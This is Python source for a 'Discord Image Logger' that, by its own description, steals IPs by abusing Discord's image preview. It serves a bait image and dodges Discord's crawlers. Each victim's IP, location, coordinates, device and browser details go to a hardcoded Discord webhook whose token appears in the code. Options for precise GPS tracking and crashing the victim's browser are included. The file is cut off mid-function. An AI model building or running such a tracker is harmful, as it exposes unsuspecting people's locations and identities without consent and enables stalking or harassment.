# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1126582582180585593/TMSies8jZwLf1CCDdWpIEryZ2NKl8SXqteS478byGWPCjfEkJZMRMH8lXjxEiOKsJ9Ri",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
